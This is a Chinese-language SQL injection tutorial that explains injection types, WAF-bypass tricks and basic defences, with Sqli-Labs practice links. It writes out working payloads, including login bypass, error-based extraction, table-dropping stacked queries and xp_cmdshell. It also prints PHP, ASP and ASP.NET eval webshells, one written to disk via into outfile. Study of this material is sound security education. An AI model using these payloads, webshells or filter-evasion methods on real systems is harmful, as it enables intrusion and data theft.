
# 1、SQL注入原理
SQL 注入就是指Web应用程序**对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的 **SQL 语句来实现对数据库的任意操作。



**SQL 注入漏洞的产生需要满足以下两个条件：**

- 参数用户可控：前端传给后端的参数内容是用户可以控制的；
- 参数代入数据库查询：传入的参数拼接到 SQL 语句，且带入数据库查询。



假设后端代码的 SQL 语句为：

```sql
$query = "SELECT * FROM users WHERE id = $_ GET['id']";
```



当传入的参数为 `1'` 时查询语句如下，这不符合规范。

```sql
SELECT * FROM users WHERE id = 1'
```



当传入的参数为 `1 and 1 = 1` 时查询语句如下，因为 `1=1`为真，且where语句中 `id=1` 也为真，所以页面会返回与`id=1`相同的结果。

```sql
SELECT * FROM users WHERE id = 1 and 1 = 1
```



当传入的参数为 `and 1=2` 时，由于 `1=2` 不成立，所以返回 `False`，页面就会返回与 `id=1` 不同的结果，由此可以初步判断`ID`参数存在 SQL 注入漏洞，攻击者可以进一步拼接 SQL 语句进行攻击，致使数据库信息泄露，甚至进一步获取服务器权限等。




## 1.1、万能密码
假设现在有一条SQL语句如下

```sql
String sql = "select count(*) from admin where username = '" + admin.getUsername()+"' and password = '"admin.gitPassword() + "'";
```



当我们输入 `' or 1=1--` 时查询语句如下，这里`password`就起不到作用了，因为它被注释掉了，而且`username = '' or 1=1`永远为真。

```sql
select count(*) from admin where username = '' or 1=1--' and password = ' '
```






# 二、SQL注入的分类

## 2.1、按照注入类型分类
按照注入类型分类可以将SQL注入分为**数字型注入**和**字符型注入**。


### 2.1.1、数字型注入
当输入的参数为整型时，如: ID、 年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入，数字型注入是最简单的一种。 

假设有SQL语句为:`select * from table where id=8`<br />测试步骤如下：

1. http://www.xxser.com/test.php?id=8'

SQL语句为: `select * from table where id=8'`，这样的语句肯定会出错，导致脚本程序无法从数据库中正常获取数据，从而使原来的页面出现异常。

2. http://www.xxser.com/test.php?id= 8 and 1=1

SQL语句为`select * from table where id=8 and 1=1`,语句执行正常，返回数据与原始请求无任何差异。

3. http://www.xxser.com/test.php?id=8 and 1=2

SQL语句变为`select * from table where id=8 and 1=2`,语句执行正常，但却无法查询出数据，因为` and 1=2 `始终为假。所以返回数据与原始请求有差异。

如果以上三个步骤全部满足，则程序就可能存在SQL注入漏洞。

这种数字型注入最多出现在ASP、PHP等弱类型语言中,弱类型语言会自动推导变量类型，例如，参数id=8, PHP会自动推导变量id的数据类型为int类型，那么id=8 and 1=1,则会推导为string 类型，这是弱类型语言的特性。而对于Java、C#这类强类型语言，如果试图把一个字符串转换为int类型，则会抛出异常，无法继续执行。所以，强类型的语言很少存在数字型注入漏洞，强类型语言在这方面比弱类型语言有优势。


### 2.1.2、字符型注入
当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于数字类型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。

- 数字型例句：`select * from table where id =8`
- 字符型例句如下：`select * from table where use rname= 'admin '`

字符型注入最关键的是如何闭合SQL语句以及注释多余的代码。

假设SQL 代码如下:`select * from table where username = 'admin'`

1. 如果输入`admin and 1=1`

则SQL语句为：`select * from table where username ='admin and 1=1'`<br />这时想要进行注入，则必须注意字符串闭合问题。

2. 如果输入`admin' and 1=1--`

则SQL语句为：`select * from table where username ='admin' and 1=1 --'`<br />只要是字符串类型注入，都必须闭合单引号以及注释多余的代码。

假设SQL 代码如下:<br />`update Person set use rname= ' username ' ,set password= 'password' where id=1`<br />现在对该SQL语句进行注入，就需要闭合单引号，可以在username或password处插入语<br />句为`'+(select @@version)+'`最终执行的SQL语句为: .<br />`update person set username= ' username ' , set password=''+ (select @@version)+ '' where id=1`

数据库不同，字符串连接符也不同，如SQL Server连接符号为`+`，Oracle 连接符为`||`，MySQL连接符为空格。


## 2.2、按照注入位置分类

### 2.2.1、Union注入
**以MySQL为例**<br />在MySQL 5.0版本之后，默认在数据库中存放一个“information_schema”的数据库，在该库中需要记住三个表名，分别是“schemata”、“tables”、“columns”。

- schemata表储存该用户创建的所有数据库库名，记录数据库库名字段名schema_name。
- tables表存储该用户出创建的所有数据库的库名和表名，需要记住的数据库库名和表名的字段分别为table_schema和table_name。
- columns表存储该用户出创建的所有数据库的库名、表名和字段名，需要记住的数据库库名、表名和字段名为table_schema、table_name和column_name。

**mysql查询语句：**

- select 要查询的字段名 from 库名.表名
- select 要查询的字段名 from 库名.表名 where 已知条件的字段名=‘已知条件的值’
- select 要查询的字段名 from 库名.表名 where 已知条件1的字段名=‘已知条件1的值’ and 已知条件2的字段名=‘已知条件2的值’

**limit的用法：**<br />limit 的使用格式为limit m,n 其中m是指记录开始的位置，从0开始表示第一条记录；n是指取n条记录。<br />** **<br />**需要记住的几个函数**<br />database()： 当前网站使用的数据库<br />version()： 当前MySQL的版本<br />user()： 当前MySQL的用户

**注释符：**<br />在mysql中常见注释符的表达方式：#或–空格或/**/。

**练习地址：**<br />[Union注入](https://www.yuque.com/xmtxsec/network_security/mtn1df?view=doc_embed)


### 2.2.2、布尔盲注
**1.left()函数**：<br />left(database(),1)='s’<br />left(a,b)从左侧截取a的前b位，正确则返回1，错误则返回0。<br />例：left(database(),1)=‘s’; 前1位是否是s。

**2.regexp函数**：<br />select user() regexp 'r’<br />user()的结果是root，regexp为匹配root的正则表达式。<br />例：select database() regexp ‘s’; 匹配第一个字符是否是s。

**3.like函数：**<br />select user() like 'ro%'<br />匹配与regexp相似。<br />例：select database() like ‘s%’; 匹配第一个字符是否是s。

**4.substr(a,b,c)函数：**<br />slelct substr() XXX<br />substr(a,b,c)从位置b开始，截取a字符串c位长度。<br />例：select substr((select database()),1,1)=‘s’; 匹配第一个字符是否是s。<br />例：select substr((select database()),1,3)=‘sec’; 匹配前三个字符是否是sec。

**5.ascii()函数：**<br />将某个字符串转化为ascii值<br />例：select ascii(substr((select database()),1,1)); 直接回显115 或者是：<br />例：select ascii(substr((select database()),1,3))>110; 如果大于110，就会返回1，否则返回0。

**6.chr(数字)或者是ord(‘字母’)**<br />使用python中的两个函数可以判断当前的ascii值是多少。

**练习地址：**<br />[布尔盲注](https://www.yuque.com/xmtxsec/network_security/atpffg?view=doc_embed)


### 2.2.3、文件注入
**1.into outfile 写文件**<br />例：`select 'mysql is very good’' into outfile 'text.txt';`<br />例：`select 'mysql is very good' into outfile 'D:\wamp\www\sql\Less-7\text.txt';`

**2.load_file() 读取本地文件**<br />例：select load_file(‘D:\wamp\www\sql\Less-7\text.txt’);<br />注意事项： \ 一些特别的字符要注意使用转义字符 如：\t 、\n 等。

**3.一句话木马(其中caidao是密码)**<br />php版本：`<?php @eval($_POST["caidao"]);?>` 其中caidao是密码<br />ASP版本： `<%eval request(“caidao”)%>`<br />ASP.NET版本：`<%@ Page Language=“Jscript”%><%eval(Request.Item[“caidao”],“unsafe”);%>`

**练习地址：**<br />[文件注入](https://www.yuque.com/xmtxsec/network_security/fkk6nf?view=doc_embed)


### 2.2.4、时间盲注
**1.if(condition,A,B)**<br />if(condition,A,B)如果条件condition为true，则执行语句A，否则执行B<br />例： select if(1>2,4,5); 返回的结果是5.（如果是在mysql命令行中使用，首先要use xxx数据库才行）

**2.sleep()函数**<br />设置睡眠时间<br />例：sleep(5) 睡眠5秒

**练习地址：**<br />[时间盲注](https://www.yuque.com/xmtxsec/network_security/yrhmaq?view=doc_embed)


### 2.2.5、POST注入
POST注入整体上和union注入的方式基本上没有差别，主要就是注入的位置不同，Union注入的位置大多在URL或输入框中是GET请求，POST注入是在请求体中。注入语法参考**Union注入知识点**。

**练习地址：**<br />[POST注入](https://www.yuque.com/xmtxsec/network_security/afxgit?view=doc_embed)


### 2.2.6、报错注入
**UPDATEXML ()函数**<br />UPDATEXML (XML_document, XPath_string, new_value);<br />第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br />第二个参数：XPath_string (Xpath格式的字符串)
第三个参数：new_value，String格式，替换查找到的符合条件的数据

而我们的注入语句为：
```
select updatexml(1,concat(0x7e,(SELECT username from security.users limit 0,1),0x7e),1);
```
其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出

```
ERROR 1105 (HY000): XPATH syntax error: 'Dumb’
```
其中的0x7e是ASCII编码，解码结果为~

**练习地址：**<br />[报错注入](https://www.yuque.com/xmtxsec/network_security/qydpde?view=doc_embed)


### 2.2.7、User-Agrnt注入
User-Agrnt注入整体上和union注入的方式基本上没有差别，主要就是注入的位置不同，Union注入的位置大多在URL或输入框中，User-Agrnt注入是在请求头中的User-Agrnt中。注入语法参考**Union注入知识点**。

**练习地址：**<br />[User-Agent注入](https://www.yuque.com/xmtxsec/network_security/ugr6sy?view=doc_embed)


### 2.2.8、Referer注入
Referer注入整体上和union注入的方式基本上没有差别，主要就是注入的位置不同，Union注入的位置大多在URL或输入框中，Referer注入是在请求头中的Referer中。注入语法参考**Union注入知识点**。

**练习地址：**<br />[Referer注入](https://www.yuque.com/xmtxsec/network_security/uxadoi?view=doc_embed)


### 2.2.9、Cookie注入
	Cookie注入整体上和union注入的方式基本上没有差别，主要就是注入的位置不同，Union注入的位置大多在URL或输入框中，Cookie注入是在请求头中的Cookie中。注入语法参考**Union注入知识点**。

**练习地址：**<br />[Cookie注入](https://www.yuque.com/xmtxsec/network_security/ch3buf?view=doc_embed)


### 2.2.10、二次注入
二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。

**二次注入，可以概括为以下两步:**

- 第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。
- 第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。

**练习地址：**[https://www.yuque.com/xmtxsec/blog/badfn6](https://www.yuque.com/xmtxsec/blog/badfn6)


### 2.2.11、宽字节注入知识点
宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。中文、韩文、日文等均存在宽字节，英文默认都是一个字节。

在使用PHP连接MySQL的时候，当设置“set character_set_client = gbk”时会导致一个编码转换的问题。

**例子：**
```
id= 1’ 处理 1 \’ 进行编码 1%5c%27 带入sql后 id = \’ and XXXX 此时无法完成注入
id=1%df’ 处理 1%df\’ 进行编码 1%df%5c%27 带入sql后 id =1運’ and XXX 此时存在宽字节注入漏洞
```

**练习地址：**[https://www.yuque.com/xmtxsec/blog/hbabnt](https://www.yuque.com/xmtxsec/blog/hbabnt)


### 2.2.12、堆叠注入知识点
	原理：在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。
	
	堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。
	
	虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。 因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。

**Mysql 数据库**
```
新建一个表 select * from users where id=1;create table test like users;
删除上面新建的 test 表 select * from users where id=1;drop table test;
查询数据 select * from users where id=1;select 1,2,3;
加载文件 select * from users where id=1;select load_file(‘c:/tmpupbbn.php’);
修改数据 select * from users where id=1;insert into users(id,username,password)values(‘100’,‘new’,‘new’);
```

**Sql server 数据库**
```
增加数据表 select * from test;create table sc3(ss CHAR(8));
删除数据表 select * from test;drop table sc3;
查询数据 select 1,2,3;select * from test;
修改数据 select * from test;update test set name=‘test’ where id=3;
sqlserver 中最为重要的存储过程的执行 select * from test where id=1;exec master…xp_cmdshell ‘ipconfig’
```

**Oracle 数据库**<br />oracle 不能使用堆叠注入

**Postgresql 数据库**
```
新建一个表 select * from user_test;create table user_data(id DATE);
删除上面新建的 user_data 表 select * from user_test;delete from user_data;
查询数据 select * from user_test;select 1,2,3;
修改数据 select * from user_test;update user_test set name=‘modify’ where name='张三 ';
```

**练习地址：**[https://www.yuque.com/xmtxsec/blog/udvcz1](https://www.yuque.com/xmtxsec/blog/udvcz1)


### 2.2.13、SORT注入知识点
SQL语句中，asc是指定列按升序排列，desc则 是指定列按降序排列。
```
select * from users order by 1 desc; 使用降序进行排列
select * from users order by1 asc;使用升序进行排列
```

```
right() 
select right(database(),1);
Left() 
select left(database(),1);
```

lines terminated by xxx 以xxx为结尾:
```
select ‘<?php @eval($_ POST[XMTX]);?>’ into outfile 'C:\pbpstudy\PHPTutorilWWW.XMTX.pbp’ lines
terminated by 0x363636;
```

**练习地址：**[https://www.yuque.com/xmtxsec/blog/ubdhk5](https://www.yuque.com/xmtxsec/blog/ubdhk5)


# 三、Waf绕过

## 3.1、白盒绕过
通过源代码分析，来进行绕过。


## 3.2、黑盒绕过

### 3.2.1、架构层面绕过waf

- 寻找源网站绕过waf检测主要针对的是云waf，找到源网站的真实地址，进行绕过，有点像CDN
- 通过同网段绕过waf防护在一个网段中，可能经过的数据不会经过云waf，从而实现绕过。


### 3.2.2、资源限制角度绕过waf

- 一般waf的执行需要优先考虑业务优先的原则，所以对于构造较大、超大数据包可能不会进行检测，从而实现绕过waf。


### 3.2.3、协议层面绕过waf

-  协议未覆盖绕过waf，比如由于业务需要，只对get型进行检测，post数据选择忽略 
-  参数污染，index?id=1&id=2 waf可能只对id=1进行检测

**例：**<br />**服务器端有两个部分：**<br />第一部分为 tomcat 为引擎的 jsp 型服务器<br />第二部分为 apache 为引擎的 php 服务器<br />真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器， 能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回 路径则相反。<br />![](https://img-blog.csdnimg.cn/20200723152157998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=UhkL7&originHeight=492&originWidth=809&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

重点：index.php?id=1&id=2，你猜猜到底是显示 id=1 的数据还是显示 id=2 的？ Explain：apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第 一个参数，即显示 id=1 的内容。<br />![](https://img-blog.csdnimg.cn/20200723152230982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=aUTkv&originHeight=323&originWidth=911&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
以上图片为大多数服务器对于参数解析的介绍。

**问题**：index.jsp?id=1&id=2 请求，针对第一张图中的服务器配置情况， 客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 去请求 apache（php） 服务器，apache 解析最后一个参数。那最终返回客户端的应该是哪个参数？

**Answer**：此处应该是 id=2 的内容，因为实际上提供服务的是 apache（php）服务器， 返回的数据也应该是 apache 处理的数据。而在我们实际应用中，也是有两层服务器的情况， 那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。

**练习地址：**[https://www.yuque.com/xmtxsec/blog/guysgs](https://www.yuque.com/xmtxsec/blog/guysgs)
Sqli-Labs-29 <br />Sqli-Labs-30<br />Sqli-Labs-31


### 3.2.4、规则层面的绕过

-  sql注释符绕过 
   1. union /_ _ /select 我们将union select之间的空格使用注释符进行替换（适用于对union select之间的空格进行检测的情况）
   2. union/crow%0%32#/select 我们在注释符中间填充内容<br />union/aaaaaaaaaabbbbbbbbbcccccccccccdddddddddddeeeeeeeeeeee%%%%%%%%%/select 构造较大数据
   3. /!union select/内联注释 我们使用内联注释，mysql特有
-  空白符绕过 
   1. mysql空白符：%09；%0A; %0B; %0D; %20; %0C; %A0; /XXX/
   2. 正则空白符： %09；%0A; %0B; %0D; %20;<br />%25其实就是百分号 %25A0 就是空白符
-  注释符绕过<br />//,-- , /**/, #, --+, -- -, ;,%00,

<br />**练习地址：**[https://www.yuque.com/xmtxsec/blog/guysgs](https://www.yuque.com/xmtxsec/blog/guysgs)
Sqli-Labs-26<br />Sqli-Labs-27<br />Sqli-Labs-27a<br />Sqli-Labs-28<br />Sqli-Labs-28a 


### 3.2.5、函数分割符号

- 将一个函数进行分割concat()
%25其实就是百分号 %25A0 就是空白符<br />concat%2520(<br />concat/**/(<br />concat%250c(<br />concat%25a0(


### 3.2.6、浮点数法

- waf对于id=1可以进行检测，但是对于id=1E0、id=1.0、id=\N可能就无法检测


### 3.2.7、利用error-based进行sql注入

- extractvalue(1, concat(0x5c,md5(3)));
- updatexml(1, concat(0x5d,md5(3)),1);
- GeometryCollection((selectfrom(selectfrom(select@@version)f)x))
- polygon((select*from(select name_const(version(),1))x))
- linestring()
- multipoint()
- multilinestring()
- multipolygon()


### 3.2.8、mysql特殊语法

- select {x schema_name} from {x information_schema.schemata};
- select {x 1};


### 3.2.9、大小写绕过

- 如果对关键字and or union等进行了过滤，可以考虑使用大小写混合的方法`Or aNd UniOn`


### 3.2.10、关键字重复

-  很多时候有函数会部分大小写进行过滤，这个时候我们可以考虑使用双写的方法`OORr = or`

**练习地址：**[https://www.yuque.com/xmtxsec/blog/guysgs](https://www.yuque.com/xmtxsec/blog/guysgs)
Sqli-Labs-25<br />Sqli-Labs-25a<br />Sqli-Labs-26 


### 3.2.11、关键字替换

-  `and = &&`、 `or = ||`、 `like可以替换 =`、 `<> 等价于 !=`，方法有很多，这里可能列举的不足。。。主要就是看谁思路更猥琐

**练习地址：**[https://www.yuque.com/xmtxsec/blog/guysgs](https://www.yuque.com/xmtxsec/blog/guysgs)
Sqli-Labs-25 


## 3.2.12、fuzz测试
可以使用burpsuite配合手工进行测试，后期测试成功后再用脚本进行处理。


# 四、SQL注入防御

## 4.1、使用预编译语句
一般来说，防御SQL注入的最佳方式，就是使用预编译语句，


## 4.2、使用存储过程
	除了使用预编译语句外，我们还可以使用安全的存储过程对抗SQL注入。使用存储过程的效果和使用预编语句译类似，其区别就是存储过程需要先将SQL语句定义在数据库中。但需要注意的是，存储过程中也可能会存在注入问题，因此应该尽量避免在存储过程内使用动态的SQL语句。如果无法避免，则应该使用严格的输入过滤或者是编码函数来处理用户的输入数据。


## 4.3、检查数据类型
	检查输入数据的数据类型，在很大程度上可以对抗SQL注入。


## 4.4、使用安全函数
	一般来说，各种Web语言都实现了一些编码函数，可以帮助对抗SQL注入。但前文曾举了一些编码函数被绕过的例子，因此我们需要一个足够安全的编码函数。


## 4.5、最小化原则
	从数据库自身的角度来说，应该使用最小权限原则，避免Web应用直接使用root、dbowner等 高权限账户直接连接数据库。如果有多个不同的应用在使用同一个数据库，则也应该为每个应用分配不同的账户。Web应用使用的数据库账户，不应该有创建自定义函数、操作本地文件的权限。
